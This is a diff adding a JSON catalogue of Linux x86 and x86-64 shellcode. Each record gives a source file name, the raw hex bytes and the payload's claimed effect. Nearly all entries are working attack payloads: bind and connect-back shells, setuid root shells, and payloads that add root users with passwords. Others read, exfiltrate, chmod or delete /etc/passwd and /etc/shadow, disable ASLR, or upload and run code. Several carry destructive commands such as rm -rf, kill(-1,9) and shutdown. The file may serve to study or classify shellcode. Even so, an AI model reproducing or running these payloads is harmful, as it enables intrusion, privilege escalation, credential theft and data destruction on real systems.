+    "arch": "x86",
+    "byte_count": 86,
+    "bytes_hex": "6a66586a015b9952536a0289e1cd80526668fcc9666a0289e16a10515089e189c643b066cd80b066d1e3cd80525689e143b066cd80936a0259b03fcd804979f96a0b5852682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "portbind port 64713",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/pwrite(-etc-shadow,_hash,_32,_8).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 89,
+    "bytes_hex": "31c9516861646f7768632f7368682f2f657489e366b9910131c0b005cd8089c3eb125931c031d2b220b0b531f66a085e31ffcd80e8e9ffffff494d4d6b6d676939244e756850733142384835757a376b454f654b663248313a",
+    "claimed_effect": "pwrite(-etc-shadow, hash, 32, 8)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/quick_(yet_conditional,_eax_!=_0_and_edx_==_0)_exit.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 4,
+    "bytes_hex": "f7f0cd80",
+    "claimed_effect": "quick (yet conditional, eax != 0 and edx == 0) exit",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/raw-socket_ICMP-checksum_shell.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "raw-socket ICMP-checksum shell",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/re-use_of_(-bin-sh)_string_in_.rodata.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 16,
+    "bytes_hex": "31c0bb088404085389e131d2b00bcd80",
+    "claimed_effect": "re-use of (-bin-sh) string in .rodata",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/read(0,buf,2541);_chmod(buf,4755);.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "31dbf7e353b609b2ed89e1b003cd8089d189e3b00fcd80",
+    "claimed_effect": "read(0,buf,2541); chmod(buf,4755);",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/reads_-etc-passwd_and_sends_the_content_to_127.1.1.1_port_12345.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 111,
+    "bytes_hex": "6a665831db4331d2526a016a0289e1cd8089c66a665843687f01010166683039665389e16a10515689e143cd8089c66a0159b03fcd80eb276a05585b31c9cd8089c3b00389e789f931d2b6ffb2ffcd8089c26a0458b301cd806a015843cd80e8d4ffffff2f6574632f706173737764",
+    "claimed_effect": "reads -etc-passwd and sends the content to 127.1.1.1 port 12345",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/reboot()_polymorphic_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 57,
+    "bytes_hex": "eb115e31c9b130806c0eff0180e90175f6eb05e8eaffffff32c1516963707075696f307366693074636a8ae4518ae3548ae3548ae2b10cce81",
+    "claimed_effect": "reboot() polymorphic shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/rm_-rf_-_which_attempts_to_block_the_process_from_being_stopped.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 132,
+    "bytes_hex": "31c089c389c141b030cd8031c0fec380fb1f72f30440cd8089c231c0b002cd8039c0740831c089c3b001cd8031c0b042cd804339da740889d331c00425cd8031c050686f67696e68696e2f6c682f2f2f6289e331c0040acd8031c050682f2f2f2f89e250682d72666689e150686e2f726d682f2f626989e35052515389e131d2040bcd80",
+    "claimed_effect": "rm -rf - which attempts to block the process from being stopped",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sends_Phuck3d!_to_all_terminals.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 60,
+    "bytes_hex": "6a0b5899526877616c6c6821207c2068636b33646820506875686563686f89e65266682d6389e152682f2f7368682f62696e89e35256515389e1cd80",
+    "claimed_effect": "sends Phuck3d! to all terminals",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/set_system_time_to_0_&_exit.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 12,
+    "bytes_hex": "6a1958995289e3cd8040cd80",
+    "claimed_effect": "set system time to 0 & exit",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setdomainname_to_(th1s_s3rv3r_h4s_b33n_h1j4ck3d_!!).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 58,
+    "bytes_hex": "eb1331c0b0795b31c9b120cd8031c0b00131dbcd80e8e8ffffff746831732073337276337220683473206233336e2068316a34636b3364202121",
+    "claimed_effect": "setdomainname to (th1s s3rv3r h4s b33n h1j4ck3d !!)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setresuid(0,0,0)--bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 35,
+    "bytes_hex": "80cde18953e28951e3896e69622f6868732f2f6851580b6a80cda4b099c931db31c031",
+    "claimed_effect": "setresuid(0,0,0)--bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setresuid(0,0,0);_execve_-bin-sh;_exit;.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 41,
+    "bytes_hex": "31c031db31c999b0a4cd8031c050682f2f7368682f62696e89e350538d0c24b00bcd8031c0b001cd80",
+    "claimed_effect": "setresuid(0,0,0); execve -bin-sh; exit;",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setreud(getuid(),_getuid())_&_execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 34,
+    "bytes_hex": "6a1858cd8050505b596a4658cd8050682f2f7368682f62696e89e39931c9b00bcd80",
+    "claimed_effect": "setreud(getuid(), getuid()) & execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setreuid()_+_exec_-usr-bin-python.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 54,
+    "bytes_hex": "31c0b04631db31c9cd80eb165b31c088430f895b10894314b00b8d4b108d5314cd80e8e5ffffff2f7573722f62696e2f707974686f6e",
+    "claimed_effect": "setreuid() + exec -usr-bin-python",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setreuid(0,0)_+_execve(-bin-sh,_[-bin-sh,_NULL]).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 33,
+    "bytes_hex": "6a465831db31c9cd8031d26a0b5852682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "setreuid(0,0) + execve(-bin-sh, [-bin-sh, NULL])",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setreuid(0,0)_execve(-bin-ash,NULL,NULL)_+_XOR.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "setreuid(0,0) execve(-bin-ash,NULL,NULL) + XOR",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/setreuid(0,_0)_+_execve(-bin--sh,_[-bin--sh,_-c,_cmd],_NULL);.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 49,
+    "bytes_hex": "6a465831db31c9cd80eb215f6a0b58995266682d6389e652682f2f7368682f62696e89e35257565389e1cd80e8daffffff",
+    "claimed_effect": "setreuid(0, 0) + execve(-bin--sh, [-bin--sh, -c, cmd], NULL);",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setreuid(geteuid(),geteuid()),execve(-bin-sh,0,0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 34,
+    "bytes_hex": "6a315899cd8089c389c16a4658cd80b00b52686e2f7368682f2f626989e389d1cd80",
+    "claimed_effect": "setreuid(geteuid(),geteuid()),execve(-bin-sh,0,0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setreuid_&_execve.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 31,
+    "bytes_hex": "31c931db6a4658cd8051682f2f7368682f62696e89e3515389e199b00bcd80",
+    "claimed_effect": "setreuid & execve",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid();_execve();_exit();.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 44,
+    "bytes_hex": "31c031db31c9b017cd8031c050686e2f7368682f2f626989e38d54240850538d0c24b00bcd8031c0b001cd80",
+    "claimed_effect": "setuid(); execve(); exit();",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid()_&_execve().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 27,
+    "bytes_hex": "31db8d431799cd80b00b52686e2f7368682f2f626989e389d1cd80",
+    "claimed_effect": "setuid() & execve()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)+setgid(0)+add_user_iph_without_password_.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 124,
+    "bytes_hex": "eb115e31c9b164806c0eff0a80e90175f6eb05e8eaffffffba213be5d78aba385dd78a740f623bd35b727d7d816e7239397a6b72396f7e6d93ed70c30b0ed78a93cd740e623bdc5c726c6b7d72726c73783972797e44397244397c797244535a5272443a443a72737a724493eb742664d78a741062d78a740b62d78a",
+    "claimed_effect": "setuid(0)+setgid(0)+add user iph without password",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0),_setgid(0)_&_execve(-bin-sh,[-bin-sh,NULL]).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 13,
+    "bytes_hex": "6a175831dbcd80b02ecd80b00b",
+    "claimed_effect": "setuid(0), setgid(0) & execve(-bin-sh,[-bin-sh,NULL])",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_&_chmod(-tmp,111)_&_exit(0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 25,
+    "bytes_hex": "6a235831dbcd8051b149682f746d7089e36a0f58cd8040cd80",
+    "claimed_effect": "setuid(0) & chmod(-tmp,111) & exit(0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_&_execve(-bin-cat_-etc-shadow).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 49,
+    "bytes_hex": "31db6a1758cd808d430b9952682f636174682f62696e89e3526861646f77682f2f7368682f65746389e152515389e1cd80",
+    "claimed_effect": "setuid(0) & execve(-bin-cat -etc-shadow)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_&_execve(-bin-sh,0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 9,
+    "bytes_hex": "6a175831dbcd80b00b",
+    "claimed_effect": "setuid(0) & execve(-bin-sh,0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_&_execve(-bin-sh,0,0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 28,
+    "bytes_hex": "31db8d431799cd8031c951686e2f7368682f2f62698d410b89e3cd80",
+    "claimed_effect": "setuid(0) & execve(-bin-sh,0,0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_&_execve(-sbin-poweroff_-f).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 47,
+    "bytes_hex": "31db6a1758cd808d430b995266686666687765726f686e2f706f682f73626989e35266682d6689e152515389e1cd80",
+    "claimed_effect": "setuid(0) & execve(-sbin-poweroff -f)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_+_chmod(-etc-shadow,_0666).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 37,
+    "bytes_hex": "31dbb017cd8031c0506861646f7768632f7368682f2f657489e366b9b601b00fcd8040cd80",
+    "claimed_effect": "setuid(0) + chmod(-etc-shadow, 0666)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_+_execve(-bin--sh,_[-bin--sh],_NULL).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 28,
+    "bytes_hex": "b01731dbcd80b00b9952682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "setuid(0) + execve(-bin--sh, [-bin--sh], NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_+_execve(-bin-sh,...).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 29,
+    "bytes_hex": "31db8d4317cd8053686e2f7368682f2f626989e3505389e199b00bcd80",
+    "claimed_effect": "setuid(0) + execve(-bin-sh,...)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid(0)_^_execve(-bin-sh,_0,_0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 27,
+    "bytes_hex": "6a175831dbcd8050682f2f7368682f62696e89e39931c9b00bcd80",
+    "claimed_effect": "setuid(0) ^ execve(-bin-sh, 0, 0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/setuid-portbind_port_31337_TCP.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 72,
+    "bytes_hex": "31c031dbb017cd8031dbf7e3b066534353435389e14bcd8089c75266687a6943665389e1b01050515789e1b066cd80b066b304cd8050505789e143b066cd8089d989c3b03f49cd80",
+    "claimed_effect": "setuid-portbind port 31337 TCP",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/shared_memory_exec.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 50,
+    "bytes_hex": "31ff31f631d2b9efbeadde31dbb31731c0b075cd8031ffbefaffffbf31d289c131dbb31531c0b075cd80b8faffffbfff30c3",
+    "claimed_effect": "shared memory exec",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/shellcode_that_forks_a_HTTP_Server_on_port_tcp-8800.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 166,
+    "bytes_hex": "31c0b002cd8085c0742231c0fec0cd8059b21bcd80b00689f3cd80b00131dbcd805eb066fec389e1cd80ffe69931c031db6a066a016a02e8e5ffffff89c731d25266682260665389e16a105157e8cffffffffec36a0557e8c5ffffff31c9525257e8bbffffff89c631c0b002cd8085c0741031c0b00689f3cd8031c031dbb304ebda89f3b004e885ffffff485454502f312e30203230300d0a0d0a3c68313e3a293c2f68313e",
+    "claimed_effect": "shellcode that forks a HTTP Server on port tcp-8800",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/shift-bit-encoder_execve.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "shift-bit-encoder execve",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/shutdown_-h_now.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 56,
+    "bytes_hex": "31c031d25066682d6889e7506a6e66c74424016f7789e75068646f776e6873687574686e2f2f2f682f73626989e35256575389e1b00bcd80",
+    "claimed_effect": "shutdown -h now",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/socket-proxy.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 348,
+    "bytes_hex": "e8ffffffffc64e5e81c618fcffffeb4889c36a0359b0ddcd805689de80cc086a0459b0ddcd80935ec389c283e01fc1ea058d8e78ffffff0fab0491c393b0038d8e48f4ffff66ba0108cd80c393b0048d8e48f4ffffcd80c38dbef8feffff31c031c966b90101f3aa31c06a015b50536a0289e1b066cd805b5a687efffeff81042401010101688104246a10515089e1b066cd80b304b066cd805a50505289e1fec3b066cd808946fce85bffffffe86fffffff31c06a015b50536a0289e1b066cd805b435f68810424688104246a10515089e1b066cd80588946f8e819ffffffe82dffffff8b5efc8b4ef86a0153516a02515339d97e0289cb56438d8e78ffffff31d231f631ffb08ecd805e585089c283e01fc1ea058d8e78ffffff0fa3049173045959eb325850e8e5feffff5831ff47837c2404027402f7df01f8e8e4feffff39c089c25831ff47833c24027502f7df01f8e8ddfeffff59e2b1eb88",
+    "claimed_effect": "socket-proxy",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sockfd_trick_+_dup2(0,0),dup2(0,1),dup2(0,2)_+_execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 50,
+    "bytes_hex": "6a025b6a2958cd804889c631c9565b6a3f58cd804180f90375f56a0b58995231f656682f2f7368682f62696e89e331c9cd80",
+    "claimed_effect": "sockfd trick + dup2(0,0),dup2(0,1),dup2(0,2) + execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/stagger_that_reads_second_stage_shellcode_(127_bytes_maximum)_from_stdin.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 14,
+    "bytes_hex": "6a7f5a545931db6a0358cd8051c3",
+    "claimed_effect": "stagger that reads second stage shellcode (127 bytes maximum) from stdin",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/stdin_re-open_and_-bin-sh_execute.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "31c031dbb006cd8053686889e331c966b91227b005cd80",
+    "claimed_effect": "stdin re-open and -bin-sh execute",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/symlink_-bin-sh_xoring.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 56,
+    "bytes_hex": "eb115e31c9b12080340e0fe2fa80340e0f56c3e8eaffffffe41d513ecf87490882510a5c82115cbf365fc28fe7e6f0f0f0206d6661207c67",
+    "claimed_effect": "symlink -bin-sh xoring",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_chmod(-etc-shadow,_599).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 39,
+    "bytes_hex": "eb1531c0b00f5b31c966b9ff01cd8031c0b00131dbcd80e8e6ffffff2f6574632f736861646f77",
+    "claimed_effect": "sys chmod(-etc-shadow, 599)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_execve(-bin-sh,_-c,_ping_localhost).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 55,
+    "bytes_hex": "6a0b589952687374202068616c686f68206c6f636870696e6789e65266682d6389e152682f2f7368682f62696e89e35256515389e1cd80",
+    "claimed_effect": "sys execve(-bin-sh, -c, ping localhost)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_exit(0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 8,
+    "bytes_hex": "31c0b00131dbcd80",
+    "claimed_effect": "sys exit(0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_kill(-1,9).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 11,
+    "bytes_hex": "31c0b0256aff5bb109cd80",
+    "claimed_effect": "sys kill(-1,9)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_rmdir(-tmp-willdeleted).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 41,
+    "bytes_hex": "eb1131c0b02831db5bcd8031c0b00131dbcd80e8eaffffff2f746d702f77696c6c64656c7465746564",
+    "claimed_effect": "sys rmdir(-tmp-willdeleted)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_sethostname(PwNeD_!!,_8).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 32,
+    "bytes_hex": "eb1131c0b04a5bb108cd8031c0b00131dbcd80e8eaffffff50774e6544202121",
+    "claimed_effect": "sys sethostname(PwNeD !!, 8)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_setuid(0)_&_sys_setgid(0)_&_execve_(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 39,
+    "bytes_hex": "eb1931c0b01731dbcd8031c0b02e31dbcd8031c0b00b5b89d1cd80e8e2ffffff2f62696e2f7368",
+    "claimed_effect": "sys setuid(0) & sys setgid(0) & execve (-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/sys_sync.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 6,
+    "bytes_hex": "31c0b024cd80",
+    "claimed_effect": "sys sync",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/unlink(-etc-passwd)_&_exit().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 35,
+    "bytes_hex": "eb115e31c031c931d2b00a89f3cd80b001cd80e8eaffffff2f6574632f706173737764",
+    "claimed_effect": "unlink(-etc-passwd) & exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/unlink_-etc-shadow.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 33,
+    "bytes_hex": "eb0f31c0b00a5bcd8031c0b00131dbcd80e8ecffffff2f6574632f736861646f77",
+    "claimed_effect": "unlink -etc-shadow",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/upload_&_exec.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 189,
+    "bytes_hex": "31dbf7e3b066534353435389e14bcd8089c7526668c7c743665389e1b0eff6d050515789e1b066cd80b0664343cd8050505789e143b066cd8089c1eb705e8d1e31c088460b5651b00566b9410266baff01cd8089c75e89f3b0038d8c2438ffffffb201cd8083f8ff743e31c939c174138d8c2438ffffff31db89fb89c2b004cd80ebd3b00689f3cd80b00631db89fbcd8031f65e89760c31c0894610b00b87f38d4b0c8d5310cd8031c040cd80e88bffffff2f7573722f62696e2f6374",
+    "claimed_effect": "upload & exec",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Add_map_in_-etc-hosts_file.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 110,
+    "bytes_hex": "4831c04883c0024831ff4831f65649b82f6574632f2f2f2f49ba2f2f2f686f737473415241504801e74831f66681c601040f0548974831c04883c001eb185eb2130f054831c04883c0030f054831c0b03c4831ff0f05e8e3ffffff3132372e312e312e3120676f6f676c652e6c6b",
+    "claimed_effect": "Add map in -etc-hosts file",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Add_root.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Add root",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/Add_root_user_with_password.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 390,
+    "bytes_hex": "48bbffffffffff73776448c1eb285348bb2f6574632f706173534889e766be410466ba84024831c0b0020f0548bfffffffffffffff0348c1ef3848bbffff2f626173680a48c1eb105348bb673a2f3a2f62696e5348bb73746f726d2e6f725348bb303a7368656c6c2d5348bb6f726d3a783a303a5348bb7368656c6c2d7374534889e648baffffffffffffff2e48c1ea384831c0b0010f0548bfffffffffffffff0348c1ef384831c0b0030f054831db4831ff4831f64831d248bbffffffffff646f7748c1eb285348bb2f6574632f736861534889e766be410466ba84024831c0b0020f0548bfffffffffffffff0348c1ef3848bbffffffffff3a3a0a48c1eb285348bb343737383a3a3a3a5348bb5a3055334d2f3a315348bb732f5064536763465348bb6178654d67364c545348bb65574537474d31245348bb6f726d3a243124725348bb7368656c6c2d7374534889e648baffffffffffffff3b48c1ea384831c0b0010f0548bfffffffffffffff0348c1ef384831c0b0030f054831ff4831c0b03c0f05",
+    "claimed_effect": "Add root user with password",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Add_user_and_password_with_echo_cmd.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 279,
+    "bytes_hex": "eb245f8077074180770a414831d2488d3f4c8d4f084c8d570b5241524151574889e6043b0f05e8d7ffffff2f62696e2f7368412d63416563686f2070776e65643a783a313030313a313030323a70776e65642c2c2c3a2f686f6d652f70776e65643a2f62696e2f62617368203e3e202f6574632f706173737764203b206563686f2070776e65643a5c24365c2475694837782e7668697644374c4c58595c2437734b314c314b572e43687157515a6f773365737670625756587952364c41343331744f4c684d6f524b6a5065726b47627852517864494a4f3249616d6f796c377961564b55566c5138444d6b336763484c4f4f662f3a31363236313a303a39393939393a373a3a3a203e3e202f6574632f736861646f77",
+    "claimed_effect": "Add user and password with echo cmd",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Add_user_and_password_with_open,write,close.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 358,
+    "bytes_hex": "4831c0505e505a040248bfffffffffff73776448c1ef285748bf2f6574632f706173574889e766be410466ba84020f0531ff4080c703eb74415941c641300a498d31b0014831d24883c2310f0531ff4080c70357580f054831c0505e040248bfffffffffff646f7748c1ef285748bf2f6574632f736861574889e766be410466ba84020f054831c0040131ff4080c703498d7131505a80c2830f0531ff4080c70357580f054831c0043c0f05e887ffffff70776e65643a783a313030313a313030323a70776e65642c2c2c3a2f686f6d652f70776e65643a2f62696e2f626173684170776e65643a24362475694837782e7668697644374c4c58592437734b314c314b572e43687157515a6f773365737670625756587952364c41343331744f4c684d6f524b6a5065726b47627852517864494a4f3249616d6f796c377961564b55566c5138444d6b336763484c4f4f662f3a31363236313a303a39393939393a373a3a3a0a",
+    "claimed_effect": "Add user and password with open,write,close",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Bind_TCP_stager_with_egghunter.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 157,
+    "bytes_hex": "eb02ffd64831d26a29586a025f6a015e0f0548974831c05048c7c3fdffeea348f7d353546a31585e6a105a0f056a32586a025e0f056a2b584883ec10545e6a10545a0f054989c16a03580f054987f94831f66a21580f0548ffc64883fe03e0f24831f648f7e64831ff4080ecff4889e6b2ff0f054080ffff741e48ffc648ffc7817efc6465616475eb817ef86465616475e20f846affffff6a3c580f05",
+    "claimed_effect": "Bind TCP stager with egghunter",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Connect_Back_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 139,
+    "bytes_hex": "31c031d231db31c9b002cd8083f8017c02eb62506a016a02b066b30189e1cd8089c331c9b03fcd804183f90475f6687f01010166681b39666a0289e16a10515389e1b066cd8031c929c8751bb002cd8083f8017c0531c050eb0db00beb1f5e525689e189f3cd8031c0b006cd80f3900f31f390eb8b31c0b00131dbcd80e8dcffffff2f62696e2f62617368",
+    "claimed_effect": "Connect Back Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Disable_ASLR_Security.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 143,
+    "bytes_hex": "4831d248bbffffffffff61636548c1eb285348bb7a655f76615f73705348bb2f72616e646f6d695348bb732f6b65726e656c5348bb2f70726f632f7379534889e766be410466baa4014831c0b0020f0548bfffffffffffffff0348c1ef3848bbffffffffffff300a48c1eb30534889e648baffffffffffffff0248c1ea384831c0b0010f054831ff4831c0b03c0f05",
+    "claimed_effect": "Disable ASLR Security",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Execute_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 27,
+    "bytes_hex": "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05",
+    "claimed_effect": "Execute -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Password_Protected_Bind_Shell.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Password Protected Bind Shell",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/Password_Protected_Reverse_Shell.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Password Protected Reverse Shell",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/Read_-etc-passwd.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Read -etc-passwd",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/Read_password.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Read password",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/Reads_data_from_-etc-passwd_to_-tmp-outfile.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 117,
